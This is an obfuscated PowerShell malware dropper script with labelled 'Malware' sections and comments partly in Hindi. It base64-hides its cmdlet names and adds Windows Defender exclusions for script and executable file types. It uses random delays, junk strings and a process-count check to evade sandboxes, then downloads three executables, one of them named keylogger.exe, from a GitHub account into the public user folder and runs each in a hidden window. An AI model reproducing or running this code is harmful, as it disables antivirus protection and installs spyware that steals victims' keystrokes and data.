# Exclusions (Double Obfuscated with Fix)
$extList = @(".ps1", ".exe", ".dll", ".lnk"); foreach ($ext in $extList) { 
    $cmdBase = [Convert]::FromBase64String('QWRkLU1wUHJlZmVyZW5jZQ=='); 
    $cmd = [Text.Encoding]::ASCII.GetString($cmdBase); 
    &([ScriptBlock]::Create($cmd)) -ExclusionExtension $ext; 
    Start-Sleep -Milliseconds 150 
}

# Delay aur Anti-Detect (Enhanced)
Start-Sleep -Seconds (Get-Random -Minimum 3 -Maximum 8)
$x = [char[]](65..90 | Get-Random -Count 6) -join ''; 
$y = [char[]](97..122 | Get-Random -Count 5) -join ''; 
$null = $x + $y + "XYZ123"

# Malware 1 (Encoded URL, Fixed Execution)
$uri1Enc = [Convert]::FromBase64String('aHR0cHM6Ly9naXRodWIuY29tL2hhY2t5aXRwcm8vbWFpbi9yYXcvcmVmcy9oZWFkcy9tYWluL3Zlbm9tLmV4ZQ=='); 
$uri1 = [Text.Encoding]::ASCII.GetString($uri1Enc); 
$out1 = "C:\Users\Public\venom1.exe"; 
if (!(Test-Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall")) { 
    $iwrCmd = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('SW52b2tlLVdlYlJlcXVlc3Q=')); 
    Invoke-Expression "& $iwrCmd -Uri '$uri1' -OutFile '$out1' -UseBasicParsing"; 
    Start-Sleep -Milliseconds 250 
}; 
$spCmd = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('U3RhcnQtUHJvY2Vzcw==')); 
if (Test-Path $out1) { &([ScriptBlock]::Create($spCmd)) -FilePath $out1 -WindowStyle Hidden }

# Malware 2 (Split Command, Fixed Syntax)
$uri2Enc = [Convert]::FromBase64String('aHR0cHM6Ly9naXRodWIuY29tL2hhY2t5aXRwcm8vbWFpbi9yYXcvcmVmcy9oZWFkcy9tYWluL2Rpc2NvcmQuZXhl'); 
$uri2 = [Text.Encoding]::ASCII.GetString($uri2Enc); 
$out2 = "C:\Users\Public\discord.exe"; 
$iwr = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('SW52b2tlLVdlYlJlcXVlc3Q=')); 
$sp = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('U3RhcnQtUHJvY2Vzcw==')); 
$cmdStr = "& $iwr -Uri '$uri2' -OutFile '$out2' -UseBasicParsing"; 
Invoke-Expression $cmdStr; 
Start-Sleep -Milliseconds 200; 
if (Test-Path $out2) { & $sp -FilePath $out2 -WindowStyle Hidden }

# Malware 3 (Junk Code, Anti-Sandbox)
$uri3Enc = [Convert]::FromBase64String('aHR0cHM6Ly9naXRodWIuY29tL2hhY2t5aXRwcm8vbWFpbi9yYXcvcmVmcy9oZWFkcy9tYWluL2tleWxvZ2dlci5leGU='); 
$uri3 = [Text.Encoding]::ASCII.GetString($uri3Enc); 
$out3 = "C:\Users\Public\keylogger.exe"; 
$junk1 = [char[]](33..47 | Get-Random -Count 6) -join ''; 
$junk2 = [char[]](48..57 | Get-Random -Count 4) -join ''; 
if ((Get-Process | Measure-Object).Count -gt 60) { 
    $iwrCmd = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('SW52b2tlLVdlYlJlcXVlc3Q=')); 
    Invoke-Expression "& $iwrCmd -Uri '$uri3' -OutFile '$out3' -UseBasicParsing" 
}; 
$null = $junk1 + $junk2; 
$spCmd = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('U3RhcnQtUHJvY2Vzcw==')); 
if (Test-Path $out3) { &([ScriptBlock]::Create($spCmd)) -FilePath $out3 -WindowStyle Hidden }
